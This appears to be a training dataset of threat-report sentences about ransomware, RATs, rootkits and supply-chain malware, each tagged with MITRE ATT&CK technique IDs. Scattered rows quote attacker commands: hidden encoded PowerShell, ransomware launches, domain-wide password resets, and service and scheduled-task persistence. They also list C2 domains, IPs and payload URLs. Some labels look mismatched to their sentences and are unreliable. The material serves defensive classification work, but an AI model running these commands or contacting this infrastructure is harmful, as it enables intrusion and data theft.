""AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="", ""stage"": { ""cleanup"": false }, ""ssh"": { ""hostname"": null, ""port"": null, ""username"": null, ""password"": null, ""privatekey"": null } } Remote Access Software As shown above, three different Remote Access Software were used by the threat actor: It is unclear why the threat actor used three different tools in order to establish an interactive and persistent command and control channel.","T1027, T1219"
The AnyDesk service password was set manually using the command line as shown below:,"T1027, T1059.003"
powershell -np -w,T1027
hidden -encodedcommand JABzAD0ATgBlAHcAL,T1027
-NoProfile --> C:\Windows\system32\cmd.exe /C cmd.exe /c,T1059.003
"This was installed from the ProgramData folder, resulting in the installation of the remote management tools.",T1219
"While the threat actors made attempts to proxy RDP traffic and minimize external RDP access, the threat actors’ workstation was revealed in several Windows logs.","T1090, T1021.001"
The client address was the internal workstation where the RDP traffic was being proxied through.,"T1090, T1021.001"
"This occurred before Rclone was used, which leads us to believe the documents were exfiltrated over one of the encrypted C2 channels.",T1041
Ransomware,T1105
The threat actors dropped the first of their ransomware binaries on the fourth day of the intrusion.,T1105
"The threat actor then tried again on a different server using a DLL this time: rundll32 locker_32.dll,run /[email protected] Again, only execution on the server was observed.",T1218.011
"""c:\windows\syswow64\windowspowershell\v1.0\powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile ➝ C:\Windows\system32\cmd.exe /C",T1059.003
locker_64.exe They then opened an RDP connection back to the primary domain controller and proceeded to try to execute the binary with a target list again.,T1021.001
"After only affecting the single host, the threat actors dropped several batch scripts on the server: pass.bat 1.bat 2.bat The script pass.bat proceeded to reset all the user accounts in the domain to a single password set by the threat actors.",T1059.003
Finally 2.bat used the reset password to enable psexec to execute the ransomware on all the remote hosts.,T1112
"When the payload was executed, there were some telltale registry events observed indicating .Quantum file extension Shell Open Command artifacts.",T1112
The following Locker files were then deleted: Diamond Model Atomic IcedID: alockajilly.com zoomersoidfor.com choifejuce.lol opiransiuera.com erinindiaka.quest opiransiuera.com zoomersoidfor.com considerf.info antiflamez.bar www.onlinecloud.cloud 64.227.12.180:80 5.196.103.145:443 66.63.188.70:443 178.128.85.30:443 5.252.177.10:443 46.101.19.119:443 Cobalt Strike: fazehotafa.com guteyutu.com 45.66.151.109 172.93.181.165 111.90.143.191 78.128.112.139 Mega User:,T1070.004
"Figure 2: SeroXen website Based on the packed versions uploaded to VT, it appears that the RAT is being used for targeting video game users.",T1027
"Several lure injector cheat files have been observed with names invoking popular videogames such as Fortnite, Valorant, Roblox or Warzone2.",T1036.005
"This is currently true from a static analysis point of view, since the RAT is packaged into an obfuscated PowerShell batch file.",T1027
"As the malware is fileless and executed only in memory after going through several decryptions and decompression routines, it is more difficult to detect by antiviruses.",T1140
"In addition, its rootkit loads a fresh copy of ntdll.dll, which makes it harder to detect by Endpoint Detection & Response (EDR) solutions that hook into it to detect process injections.",T1055
The RAT employs anti-debugging techniques by leveraging Windows Management Instrumentation (WMI) to identify the system’s manufacturer.,"T1047, T1082"
"Execution analysis When the malicious payload is delivered to the victim, commonly through a phishing mail or a Discord channel – the victim often receives a ZIP file containing a benign file in plain sight, and the heavily obfuscated batch file is hidden and automatically executed when launched.","T1027, T1566.001, T1204.002"
"The bat file format is always very similar and looks like the contents of Figure 4, followed by base64 encoded text later in the file.","T1027, T1059.003"
"During the bat execution, the script extracts two separate binaries from the base64 encoded text, AES decrypts, and GZIP decompresses it to produce two separate byte arrays.","T1027, T1140"
"Throughout the decryption process, the attackers had the need to create a legitimate looking folder to drop an illicit version of the System Configuration Utility msconfig.exe that is required later.",T1036.005
"For this purpose, the script creates the folder “C:Windows System32”, with a space after Windows and deletes it as soon as the utility is running.","T1036.005, T1070.004"
The execution of one of the above-mentioned binaries leads to another obfuscated binary carrying an embedded resource.,T1027
"This resource is hidden behind anti-sandboxing and debugger techniques, only to lead to more obfuscation and encryption techniques that lead to the final payload.",T1027
"This payload has been built using the Github project Costura, which allows SeroXen to pack the code’s dependencies into the .NET assembly so it can run self-contained.",T1027
The extraction of the resources leads to the final payloads.,T1027
This rootkit supports both x32 and x64 Windows processes and has the following features: Fileless persistence: The rootkit is stored as obfuscated data in the registry and is spawned with PowerShell via Task Scheduler to be injected into the winlogon.exe process.,"T1112, T1027, T1059.003, T1055, T1053.005"
Child process hooking.,T1027
Option to embed additional malware to be executed with the rootkit – in this case NirCmd and/or Quasar.,T1027
The added malware will be decompressed and decrypted before it is injected into other processes.,"T1055, T1140"
In memory process injection: the rootkit injects itself and additional malware(s) into all processes.,T1055
Hooking: Hooks several functions from ntdll.dll to hide its presence.,T1055
"DLL unhooking: Removes EDR hooks by loading a fresh copy of “ntdll.dll” from disk to avoid process hollowing detection Hiding entities: Hiding all entities starts with a configurable prefix, which in SeroXen’s case its “$sxr”.",T1055
"The prefix is used to hide files, directories, NamedPipes, scheduled tasks, processes, registry keys/values, and services.",T1027
The InstallStager service is responsible for: Creating a registry key to store the malware code and writes it as encrypted data.,"T1027, T1053.005, T1112"
Creating a scheduled task to execute the malware using PowerShell.,"T1059.003, T1053.005"
PowerShell will decompress and decrypt the final payload (Service) that will be injected into the winlogon.exe process and executed via dllhost.exe using process hollowing techniques.,"T1055, T1140"
The service kicks off the load of the rootkit’s DLL that is embedded as a resource and saves its configuration as a registry key.,"T1027, T1112"
The service creates 3 listener threads: NewProcessListener: Enumerates all running processes and injects the rootkit when new processes are created.,"T1057, T1055"
ChildProcessListener: Injects the rootkit to a newly created process by another process and updates the callee via NamedPipe. Figure 7.,T1055
The control code that executes a file using ShellExecute.,T1106
CONTROL_USER_RUNPE The control code that executes an executable using process hollowing.,T1055
"The DLL rootkit carries out process injections, executes commands received by other processes, and keeps out of sight any sign of SeroXen being executed within the system.",T1055
"Since Seroxen is based on QuasarRAT, the C&C server utilizes the same Common Name in their TLS certificate.",T1071.001
"The functionalities offered by the threat actor for the C&C server closely mirror those found in the Quasar Github repository, including support for TCP network streams (both IPv4 and IPv6), efficient network serialization, compression using QuickLZ, and secure communication through TLS encryption. Figure 10.","T1095, T1027, T1071.001"
Monitoring clipboard events to steal clipboard content.,T1005
Monitoring file system events to collect new and modified files.,"T1005, T1113"
Controlling attached camera devices to take pictures of the compromised computer’s surroundings.,T1113
"The LookBack backdoor utilized by TA410 uses a custom network protocol, which can function over HTTP or raw TCP, for C&C server communications.","T1095, T1071.001"
"The first stage of the FlowCloud version identified by ESET researchers can check whether specific security software is installed on the machine it tries to compromise, but this isn’t implemented in the loaders we analyzed.",T1518.001
"However, we found a custom AntivirusCheck class, which can check running processes against a hardcoded list of executable filenames from known security products, including ESET products.","T1057, T1518.001"
"Even though we believe that this version of FlowCloud is still undergoing development and testing, the cyberespionage capabilities of this version include the ability to collect mouse movements, keyboard activity, and clipboard content along with information about the current foreground window.",T1056.001
"They compromise their targets either by spearphishing, according to Proofpoint, or, for LookingFrog and JollyFrog, by compromising a web-facing application such as Microsoft Exchange or SharePoint.",T1190
"This could indicate that victims are targeted specifically, with the attackers choosing which entry method is the best for a given target.",T1190
The public-facing application compromise approach is what we have seen the most.,T1190
"Attackers linked to LookingFrog exploited Microsoft SharePoint servers in 2019 to gain code execution, probably by leveraging CVE-2019-0604.",T1190
"These were either dropped directly via the webshell or downloaded from a remote server using certutil.exe, a known LOLBin.",T1105
"In addition to the full-featured backdoors analyzed in the following sections, these attackers use a variety of tools such as vulnerability scanners, exploits from the Equation Group leaks, proxy/tunneling utilities (HTran, LCX, EarthWorm), and lateral movement scripts such as WMIExec. Arsenal TA410 – FlowingFrog FlowingFrog uses a first stage that ESET researchers have named the Tendyron downloader, and a complex second stage named FlowCloud, so named by the developers in its modules’ PDB paths.","T1090, T1047"
"Encoded Royal Road payload On October 13th 2020, we noticed that a new Royal Road RTF document, shown in Figure 3, had been uploaded to VirusTotal.",T1027
"When opened, the document triggers the injection of a custom downloader – a PE executable – into an iexplore.exe process.",T1055
The following files are downloaded and written to disk: http://103.139.2[.]93:1702/tdr.dat written to %localappdata%\Tendyron\Tendyron.exe (SHA-1: 09C76522136B5E9BAB74381FEEE265F7E9B1D550) http://103.139.2[.]93:1702/okt.dat written to %localappdata%\Tendyron\OnKeyToken_KEB.dll (SHA‑1: F359D3C074135BBCA9A4C98A6B6544690EDAE93D) http://103.139.2[.]93:1702/md.dat written to %localappdata%\Tendyron\Tendyron.conf (we were not able to retrieve this file),T1105
Persistence for the downloaded payload is established via the Tendyron value under the Run key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.,T1547.001
The export OnKeyT_ContextInit contains code that decrypts hardcoded shellcode (see Figure 4) and injects it into iexplore.exe using WriteProcessMemory.,"T1055, T1140"
"Shellcode decryption loop The next stage, injected into iexplore.exe, is a backdoor written using the Microsoft Foundation Class (MFC) framework.","T1055, T1140"
"On VirusTotal, as shown in Figure 5, we can see one more HTTP request to 103.139.2[.]93 was triggered during the execution of the RTF file.",T1071.001
The result of the request to http://103.139.2[.]93:1702/SL3716/S8437AEB.DAT was recorded by VirusTotal and the SHA-1 of this encrypted file is 140F81037A76B7B16A00E1D5E0E2CD9F6687F642.,T1027
Figure 5. URL requests seen by the VirusTotal sandbox during execution of the malicious RTF document,T1027
The identical encrypted file was also downloaded from http://114.55.109[.]199:56022/SL3716/S8437AEB.DAT by a FlowCloud dropper version 4.1.3 (SHA‑1: 014421BDB1EA105A6DF0C27FC114819FF3637704).,T1027
"It consists of three main components, deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis.",T1027
The first stage is responsible mostly for creating the files and registry keys used by the other stages.,T1112
"The values for these executables and configuration data can be found, encrypted, in the loader’s resource section.",T1027
"Contents of the dropper’s resources Resource IDRoleInternal name 100FlowCloud RAT DLLfcClientDll 10132-bit rootkit driverDriver 10264-bit rootkit driverDriver 103DLL hijacking vulnerable appN/A 104Shellcode loaded by the malicious library in the DLL hijackingSETLANG_dlcore 105Shellcode that loads fcClient (unused)N/A 106Final dropper stagefcClient 10732-bit persistence modulefcClientWD_x86 10864-bit persistence modulefcClientWD_x64 109Legitimate library used for module stompingslam 110DLL used for hijackingXXXModule_dlcore0 1000Protobuf serialized FlowCloud configurationN/A 1001Dropper configurationN/A 2000Used as an alternative or extension to resource 2001N/A 2001Path to the registry key for the PrintProcessor service (used by the driver)N/A 10000Installation configurationN/A In the instances we observed, most resources are written to disk encrypted, and only decrypted in memory when needed.","T1027, T1140, T1112"
"In some cases, they are then re-encrypted but with a different key.",T1027
"The paths and registry keys to use, and whether they should be decrypted before being written, are defined in the installation configuration.","T1140, T1112"
"FlowCloud uses filenames that are either similar to those of legitimate Windows files (e.g., rebare.dll which could be mistaken for rebar.dll) or innocuous looking (e.g., AC146142) to avoid suspicion.",T1036.005
"FlowCloud deployment process First, the loader decrypts and parses the embedded installation configuration, which uses the Windows INI format.",T1140
This configuration defines the malware’s install path along with the filename or registry key where each embedded resource is to be written.,T1112
"The configuration can also contain a section defining specific security software to check for, but this isn’t implemented in the loaders we analyzed.",T1518.001
"However, there is a custom AntivirusCheck class, which can check running processes against a hardcoded list of XOR-encrypted executable filenames from known security products: 360 Total Security, Avast, Avira, AVG, Bitdefender, ESET, Jiangmin Technology Antivirus, Kingsoft, McAfee, Micropoint, Norton, Rising Antivirus, and Trend Micro.","T1057, T1518.001"
"Depending on the configuration keys used, the loader can either load the fcClientDll RAT module directly, thus bypassing most of the complex deployment process, or it can create a service or scheduled task.","T1543.003, T1053.005"
"In the former case, the task or service attains persistence by being set to start automatically on boot.",T1547.001
"In the samples we observed, the task or service was configured to execute the next step of the installation process by running a legitimate application vulnerable to DLL search-order hijacking.",T1569.002
The application and the accompanying relevant and malicious DLL were both embedded in the loader’s resources.,"T1574.002, T1027"
DLL side-loading (XXXModule_dlcore0),T1574.002
Strings contained in the malicious DLL also point to emedres.dll from Emurasoft’s EmEditor as a possible third target for DLL side-loading.,T1574.002
"In all observed samples, the malicious library is the same and serves to load and execute shellcode from a file that is stored under the same name as the DLL, but with a .dat extension.",T1574.002
"Despite its relatively simple goals, the library’s code makes heavy use of anti-debugging tricks and control flow obfuscation to hinder analysis.",T1027
"In the function that loads the next file, the useful code is repeatedly interspersed with the same sequence of opcodes to obfuscate the program’s flow.",T1027
"Annotated disassembly of the control flow obfuscation snippet The above snippet is bookended by calls to two anti-debugging functions, as can be seen in Figure 10.",T1027
It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.,T1547.001
"First, persistence is established by using the ITaskService COM interface to create the \Microsoft\Windows\CertificateServicesClient\NetTask scheduled task.",T1053.005
"If a task with the same name already exists, it is deleted before the new one is created.",T1027
This task will run the DLL hijacking target as SYSTEM at each boot.,T1053.005
"Afterwards, the rootkit module is decrypted and written to the %System%\drivers folder as hidmouse.sys.",T1140
A hidmouse service is then created to run that module and is immediately started.,"T1543.003, T1569.002"
The file is then deleted from the disk and replaced by a copy of the legitimate hidusb.sys driver from the same folder.,T1070.004
"The encrypted shellcode: rebare.dat The rebare.dat shellcode is very similar to that used in the self-decrypting DLL, but it loads fcClient directly.",T1140
FlowCloud then starts a suspended process to perform injection on it.,T1055
This process is created via CreateProcessAsUserW using a token retrieved from the explorer.exe or winlogon.exe process in the current session.,T1055
The injected code loads the same backdoor (rescure.dat) into the process’s memory and calls its startModule export to finish the installation.,T1055
"Meanwhile, the injection process is terminated.",T1055
"To achieve this, the new process loads the decoy DLL and manually replaces its content in memory with the fcClientDll module (a process known as module stomping or DLL hollowing), before calling its main function.",T1574.002
"File exfiltration is done through encrypted, Protobuf-serialized structures and is disguised as HTTP by prepending the data with a hardcoded, fake POST request.",T1071.001
"Hardcoded, fake HTTP POST request used for FlowCloud C&C communication This component uses an encrypted, Protobuf-serialized configuration that it tries to read from a file on disk or a registry key.","T1012, T1071.001"
This configuration corresponds to resource 1000 in the initial loader.,T1041
"It defines the address and port for both the exfiltration server (file_server) and the C&C server (exchange_server), along with the encryption key to use for communication with each.",T1041
"These roughly follow an internal naming convention where classes with names ending with manager_handler perform actions in response to C&C commands, while those whose names end with manager automatically perform actions based on timers or event listeners.",T1074.001
"Each manager stores collected data in its own SQLite database, while data that is collected on demand is returned directly to the C&C server.",T1074.001
"Data exfiltration is likewise automated: policies can contain a cache_size or cache_count parameter, which determines how much data can be collected locally by the corresponding class before it is staged for exfiltration.",T1074.001
"The policys [sic] section of a decoded FlowCloud config As we have previously mentioned, this implant uses a lot of classes.",T1140
"Rather than documenting each of them individually, we will present an overview of the available functionality by grouping them into three categories: those that interact with the file system, functionalities that collect information about programs and processes, and those that gather real-time information about user activity.",T1057
One of these is a component that walks through all mapped file systems and collects files that are not excluded by filters in the smfile_search_policy.,T1083
The corresponding files are collected unless they are excluded by that policy.,"T1005, T1082"
"Another component collects information about mapped volumes, including mount point, name, drive type, and disk usage data.",T1082
This same class collects file and directory metadata.,T1083
This includes bidirectional file transfers between the C&C and the compromised machine. Programs and processes FlowCloud is able to automatically obtain a list of installed software through the use of the undocumented IShellAppManager COM interface.,T1041
Simplified code showing how the IShellAppManager COM interface is used to list installed applications Other commands can be used to retrieve a detailed list of available services and currently running processes.,T1057
"To achieve this, FlowCloud runs WMI queries every second to get all process creation and termination events.",T1047
FlowCloud can periodically take screenshots and store them with information about the foreground process and time since the last user input.,T1113
"To limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture aren’t saved.",T1113
Another of the backdoor’s components records mouse and keyboard activity to a database.,T1056.001
"It does not collect these directly, but instead acts in tandem with the keylogger component of the driver (described in the next section) by reading data from the \\.\pipe\namedpipe_keymousespy_english named pipe.",T1056.001
"The default value is 65 decibels, which is in the upper range of normal conversation volume (commonly defined to be anywhere between 50 and 70 dB by various sources).",T1140
Self-decrypting DLL (setlangloc.dat),T1140
The loaded shellcode is a self-decrypting DLL.,T1140
It first decrypts the embedded DLL using a byte-oriented XOR-and-ADD scheme (shown in Figure 16).,"T1027, T1140"
"The shellcode we analyzed used the key 0x7B. Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded module’s startModule export.","T1027, T1106, T1140"
Pseudocode for the DLL decryption routine This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.,T1140
"On top of those, it also uses a few tricks of its own: Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW. Base64-encoded strings are used for function imports (via GetProcAddress) and only decoded as needed.","T1027, T1106, T1140"
"Exits if the process’s executable is not the expected DLL hijacking target (e.g., setlang.exe).",T1055
"The module creates a new process using the same executable and performs process injection on it, redirecting the existing thread to the written code region.",T1055
This code inside the new process launches a thread that decrypts and loads the fcClient module before calling its startModule export.,T1140
Driver (hidmouse.sys) FlowCloud’s driver serves a dual purpose: it acts as both a keylogger and a rootkit.,T1056.001
It accomplishes this mainly by hijacking native drivers’ handler functions for specific I/O control codes and replacing them with its own: Read (IRP_MJ_READ) for the keyboard driver (kbdclass or KeyboardClass0) Read (IRP_MJ_READ) for the mouse driver (mouclass or PointerClass0),T1056.001
They can be invoked via IO control codes or by writing to specific registry keys.,T1112
"Issued to Hangzhou Leishite Laser Technology Co. in 2012 by Wosign and revoked in 2014, it seems most likely this certificate was stolen.",T1056.001
"Keylogging In its IRP_MJ_READ handlers for keyboard and mouse events, the driver simply records IO events to lookaside lists before passing them to the legitimate handler.",T1056.001
"Rootkit After hijacking the aforementioned drivers, the rootkit erases the DLL names associated with them from internal structures used to display device drivers.",T1027
"As shown in Figure 17, it achieves this by removing their entries from the ActiveProcessLinks list of the undocumented KPROCESS kernel structure.",T1027
This process is further camouflaged by changing its associated executable filename to one of svchost.exe or dllhost.exe in the same kernel structure.,T1036.005
It checks running processes for executables of several known cybersecurity vendors.,"T1057, T1518.001"
This tends to support the proposition that versions 4 and 5 of FlowCloud are maintained in parallel.,T1027
It also embeds a DLL version of the Pafish (aka Paranoid Fish) sandbox and analysis detection tool as one of its encrypted resources.,T1027
"Unfortunately, we were not able to uncover any persistence method.",T1055
The loader injects an orchestrator into memory in a svchost.exe process.,T1055
"In turn, the orchestrator injects the network component into memory and communicates with it via a file located at C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\Log\rsa.txt.",T1055
It is encrypted using the AES algorithm and stored in the Windows registry.,"T1573.001, T1112"
Table 2 shows the three registry keys used by X4.,T1112
Network shellcode registry keys Registry KeyDescription HKLM\SOFTWARE\Microsoft\DRM\X4KeyAES key. HKLM\SOFTWARE\Microsoft\DRM\PSKeyName of the process into which the shellcode will be injected (spoolsv.exe). HKLM\SOFTWARE\Microsoft\DRM\X4DataEncrypted shellcode.,"T1055, T1140, T1112"
The decrypted shellcode looks like it was based on Metasploit and communicates with a hardcoded IP address via HTTP.,"T1140, T1071.001"
X4 backdoor commands IDNameDescription 0x3ECFF9B9D92osloadWrite new encrypted shellcode to HKLM\SOFTWARE\Microsoft\DRM\X4Data.,T1027
0x3F5FB1E6015pslistList the running processes using CreateToolhelp32Snapshot and Process32Next.,T1057
"0x3B6C27610D1injectDecrypt and inject shellcode, from encrypted form on disk, into memory.",T1055
0xDA83E71execExecute a given command line.,T1059.003
0xE9478DCliveGet the PID of the process in which the orchestrator is running.,T1057
This module is embedded in the library’s resource section and encrypted with an algorithm similar to RC4.,T1027
Decompiled view of the function used to encrypt and decrypt the embedded module The SodomNormal component tries to read configuration information from a sodom.ini file.,"T1027, T1140"
This configuration file is encrypted using the just-described function and starts with the magic bytes 0xAF1324BC.,T1027
This is sent to the server along with the computer’s name and the configuration data.,T1082
"The communications module then downloads the main backdoor module, named SodomMain, from the C&C server.",T1105
Communication protocol LookBack can communicate over HTTP or via its “normal protocol”.,T1071.001
LookBack’s normal protocol uses raw TCP sockets and a custom message format described in Table 4.,T1095
42ServerTransfer file to client in message body (response to message 41),T1071.001
"The HTTP protocol uses the message format detailed in the previous paragraph, but it adds a few extra steps to disguise its traffic as legitimate HTTP.",T1071.001
"The fields required for HTTP, such as content length, address, and port number, are filled in with the correct values; useless data is used for the others.",T1071.001
"Template used for HTTP client requests On the server side, the data described in the previous section is sent directly as binary data in the body with a header purporting it is a GIF image.",T1071.001
Template used for HTTP server responses TA410 – JollyFrog This third team uses off-the-shelf malware from the known malware families QuasarRAT and Korplug (aka PlugX).,T1071.001
Then it jumps right into the shellcode that will decompress and load the Korplug payload.,T1140
"Digital signature of the QuasarRAT downloader This downloader simply downloads the loader and encrypted QuasarRAT payload from the hardcoded C&C server http://ffca.caibi379[.]com, at /rwjh/new/.","T1027, T1105"
"The loader is named PresentationCache.exe and is protected with DNGuard, a commercial .NET packer.",T1027
"It decrypts and loads the final QuasarRAT payload, which uses cahe.microsofts[.]org as its C&C server.",T1140
"ESET is revealing its latest findings about this group, including results from ongoing research, during Botconf 2022.",T1190
"Initial access to targets is obtained by exploiting vulnerable internet-facing applications such as Microsoft Exchange, or by sending spearphishing emails with malicious attachments such as RTF documents created via the Royal Road builder.","T1190, T1566.001"
Initial AccessT1190Exploit Public-Facing ApplicationTA410 has exploited web server vulnerabilities for initial access.,T1190
T1566.001Phishing: Spearphishing AttachmentTA410 uses malicious RTF and DOCX attachments to compromise victims.,T1566.001
ExecutionT1106Native APIFlowCloud makes extensive use of the Windows API to execute commands and launch processes.,T1106
T1559.001Inter-Process Communication: Component Object ModelFlowCloud uses COM interfaces to schedule tasks and perform WMI queries.,"T1047, T1053.005"
T1047Windows Management InstrumentationTA410 uses WMI for lateral movement and information gathering.,T1047
PersistenceT1053.005Scheduled Task/Job: Scheduled TaskFlowCloud creates a scheduled task for persistence.,T1053.005
Windows ServiceFlowCloud can be configured to create a service for persistence.,T1543.003
Defense EvasionT1027Obfuscated Files or InformationFlowCloud files are distributed and stored in encrypted form.,T1027
Match Legitimate Name or LocationFiles named after legitimate utilities are written into the %ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\ subdirectory.,T1036.005
T1055.001Process Injection: Dynamic-link Library InjectionFlowCloud uses both regular and reflective DLL injection.,T1055
T1055Process InjectionTA410’s backdoors perform process injection to masquerade as harmless processes.,T1055
T1574.002Hijack Execution Flow: DLL Side-LoadingFlowCloud uses DLL Side-Loading to launch its second-stage dropper.,T1574.002
T1070.004Indicator Removal on Host: File DeletionFlowCloud deletes its rootkit’s executable after launching it.,T1070.004
DiscoveryMultiple TA410 backdoors can list running processes.,T1057
T1083File and Directory DiscoveryFlowCloud can search through connected file systems and obtain directory listings.,T1083
T1016System Network Configuration DiscoveryFlowCloud can discover and use locally configured proxies.,T1090
T1012Query RegistryFlowCloud components use registry keys to signal each other.,T1012
T1056.001Input Capture: KeyloggingFlowCloud records keystrokes.,T1056.001
CaptureFlowCloud takes screenshots at regular intervals.,T1113
T1074.001Data Staged: Local Data StagingFlowCloud stores collected data in local SQLite databases prior to exfiltration.,T1074.001
T1005Data from Local SystemFlowCloud can exfiltrate files from local file systems.,T1005
T1560.003Archive Collected Data: Archive via Custom MethodFlowCloud compresses some collected data by removing duplicates and similar screen captures.,T1113
Command And ControlT1071.001Application Layer Protocol: Web ProtocolsLookBack and FlowCloud can send and receive data over HTTP.,T1071.001
T1095Non-Application Layer ProtocolLookBack can communicate over raw TCP sockets.,T1095
"Symmetric CryptographyFlowCloud can use XOR, TEA, RC4 and a modified AES algorithm to encrypt traffic and files.",T1573.001
ExfiltrationT1030Data Transfer Size LimitsFlowCloud uses local caches to stage data and exfiltrates their content when it reaches a size specified in its configuration.,T1074.001
Obfuscation is one of the most popular methods to achieve this.,T1027
"For example, several of our previous research blogs have explored incidents in the npm landscape in which JavaScript obfuscation was used.",T1027
"Along with the increase in malicious modules, my team has observed an increase in the use of various obfuscation techniques in malware published to the PyPI repository.",T1027
"One of the most popular obfuscation techniques is execution of Base64-encoded malicious code, which was first observed in campaigns related to W4SP authors in November 2022.",T1027
"Variations of that attack, in which malicious code is embedded in code but shifted past the edge of default screen borders (thereby hiding it from view), are still seen in the wild.",T1027
"For example, use of W4SP crew obfuscation tools such as Hyperion and Kramer is on the rise — likely a response to the improving detection capabilities of security companies monitoring PyPI and other public package repositories.",T1027
"In most of the malicious campaigns that my team has observed leveraging PyPI packages, the executables are not present in the malicious package but are downloaded and run by the plaintext PY files from external infrastructure.",T1105
"Among other things, it collects usernames, hostnames, and directory listings.","T1083, T1033, T1082"
"It also fetches commands that are set for execution using scheduled tasks or cronjob, depending on the host platform.",T1053.005
"In fact, while I have been writing this blog, my team observed it download and execute yet another Python script from the cron_script located on the same host.",T1105
"Figure 4: Code responsible for downloading cron_script file A misconfigured web host gives up the goods Given the malware’s reliance on remote C2 infrastructure, it made sense to scout out the web host used in the attack to get more information about the malware’s capabilities.",T1105
"However, we can confirm that developers did install the malicious PyPI package and that their machine names, usernames, and directory listings were harvested as a result.","T1083, T1033, T1082"
Some of the filenames suggest that additional malware commands include keylogging functionality.,T1056.001
That is why malware hidden inside the Python compiled byte code could slip under the radar of the traditional security solutions.,T1027
"ReversingLabs Software Supply Chain Security supports static analysis and unpacking for a wide range of binary file formats, including the kind of compiled Python byte code seen in this attack.",T1027
"By examining the components of the rogue firmware and other malicious artefacts from the target’s network, we were able to reach the following conclusions:",T1027
"The inspected UEFI firmware was tampered with to embed a malicious code that we dub MoonBounce; Due to its emplacement on SPI flash which is located on the motherboard instead of the hard disk, the implant is capable of persisting in the system across disk formatting or replacement; The purpose of the implant is to facilitate the deployment of user-mode malware that stages execution of further payloads downloaded from the internet; The infection chain itself does not leave any traces on the hard drive, as its components operate in memory only, thus facilitating a fileless attack with a small footprint; We detected other non-UEFI implants in the targeted network that communicated with the same infrastructure which hosted the the stager’s payload; By assessing the combination of the above findings with network infrastructure fingerprints and other TTPs exhibited by the the attackers; to the best of our knowledge the intrusion set in question can be attributed to APT41, a threat actor that’s been widely reported to be Chinese-speaking; In this report we describe in detail how the MoonBounce implant works, how it is connected to APT41, and what other traces of activity related to Chinese-speaking actors we were able to observe in the compromised network that could indicate a connection to this threat actor and the underlying campaign.","T1027, T1105"
"The source of the infection starts with a set of hooks that intercept the execution of several functions in the EFI Boot Services Table, namely AllocatePool, CreateEventEx and ExitBootServices.",T1106
"This driver, which runs during the initial phases of the kernel’s execution, is in charge of deploying user-mode malware by injecting it into an svchost.exe process, once the operating system is up and running.",T1055
"Finally, the user mode malware reaches out to a hardcoded C&C URL (i.e. hxxp://mb.glbaitech[.]com/mboard.dll) and attempts to fetch another stage of the payload to run in memory, which we were not able to retrieve.",T1105
"This is an in-memory implant, implemented as position-independent code, that can communicate to a C2 server in order to exchange information and stage the execution of additional plugins in memory, of which none has been sighted in the wild yet.",T1105
"It obtains the ScrambleCross shellcode by applying a modified ChaCha20 algorithm on an encrypted blob, which may reside as an additional file on disk or be embedded in the loader itself.",T1027
"In one case, we observed such altered wbemcomn.dll (MD5: C3B153347AED27435A18E789D8B67E0A) file, which originally facilitates the functionality of WMI in Windows and was located in the directory %SYSTEM%\wbem.",T1047
"As a consequence, when the WMI service was initiated, the rogue version of this DLL forced the loading of a StealthVector image named wmiwk.dll.",T1047
"Appended IAT entry to a rogue wbemcomn.dll file which forces the loading of StealthVector upon initiation of the WMI service The table below specifies all instances of StealthVector that we detected in the targeted network, along with timestamp artefacts that might point to the date of their creation.",T1047
It works by decrypting a shellcode BLOB with AES-256 and injecting it to the address space of another process.,"T1055, T1140"
The injected process in every case we observed was msdt.exe (Microsoft Diagnostic Troubleshooting Wizard).,T1055
The first way is by executing a launcher utility with the filename System.Mail.Service.dll (MD5: 5F9020983A61446A77AF1976247C443D) through the command line as a service.,"T1059.003, T1569.002"
"This is outlined in the following commands typed by the attackers on one of the compromised systems:net start ""iscsiwmi"" sc stop iscsiwmi sc delete iscsiwmi reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"" /v",T1112
"""iscsiwmi"" /f sc create ""iscsiwmi"" binPath= ""$system32\svchost.exe -k iscsiwmi"" type= share start= auto error= ignore DisplayName= ""iscsiwmi"" SC failure ""iscsiwmi"" reset= 86400 actions= restart/60000/restart/60000/restart/60000 sc description ""iscsiwmi"" """"iSCSI WMI Classes That Manage Initiators, Ports, Sessions and Connections"""" reg add ""HKLM\SYSTEM\CurrentControlSet\Services\iscsiwmi\Parameters"" /f reg add ""HKLM\SYSTEM\CurrentControlSet\Services\iscsiwmi\Parameters"" /v",T1112
"Mail.Service.dll"" /f net start ""iscsiwmi"" The launching utility in turn uses the .NET InstallUtil.exe application in order to execute the StealthMutant image, which has the filename Microsoft.Service.Watch.targets, and providing it with the encrypted ScrambleCross shellcode as an argument from a file named MstUtil.exe.config.",T1027
The utility itself is a basic C++ program that achieves the aforementioned goal by issuing the following command line using the WinExec API:C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe,"T1106, T1059.003"
Watch.targets,T1053.005
"The second way to execute StealthMutant is through the creation of a scheduled task via a Windows batch script file named schtask.bat, as outlined below:@echo off cd /d","T1059.003, T1053.005"
"NET\Framework64\v4.0.30319\MstUtil.exe.config"" schtasks /create",T1053.005
"/TN ""\Microsoft\Windows\UNP\UNPRefreshListTask"" /SC ONSTART /TR",T1053.005
/F /DELAY 0000:02 /RU SYSTEM /RL HIGHEST schtasks /run,T1053.005
"The implants we observed in this campaign are shipped as DLLs that ought to run in the context of exe, with the primary intent of reading a C2 address from an encrypted configuration file stored in %WINDIR%\debug\netlogon.cfg and reaching out to the server to obtain a further payload.","T1027, T1105"
Both the IP and the server directory path are encrypted with AES-128 using a base64 encoded key stored in the backdoor’s image.,T1573.001
The IP and directory path tuple are used during execution for: Initialising communications with the server; Sending information from the infected host; Requesting a specific server path containing a command for execution and downloading it;,T1041
